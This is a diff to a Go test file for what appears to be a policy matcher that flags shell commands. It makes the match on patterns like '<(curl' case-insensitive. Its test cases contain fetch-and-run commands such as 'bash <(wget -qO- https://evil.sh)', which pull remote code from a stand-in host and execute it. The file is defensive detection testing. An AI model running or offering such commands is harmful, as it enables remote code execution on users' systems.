@@ -170,8 +170,9 @@ func TestMatchCondition_CommandContains(t *testing.T) {
 		{"wget proc subst", []string{"<(wget"}, nil, "bash <(wget -qO- https://evil.sh)", true},
 		// OR with command_matches — command_contains fires even if command_matches misses.
 		{"contains fires when matches misses", []string{"<(curl"}, nil, "source <(curl https://x.sh)", true},
-		// Case sensitive — uppercase should NOT match.
-		{"case sensitive miss", []string{"<(curl"}, nil, "bash <(CURL https://evil.sh)", false},
+		// Case-insensitive — uppercase variants are still caught.
+		{"case insensitive hit", []string{"<(curl"}, nil, "bash <(CURL https://evil.sh)", true},
+		{"case insensitive mixed", []string{"<(curl"}, nil, "BASH <(Curl https://evil.sh)", true},
 		// Empty substring matches everything (edge case — don't use in policy but shouldn't panic).
 		{"empty substring", []string{""}, nil, "anything at all", true},
 		// command_not_matches exclusion still applies even when command_contains matches.
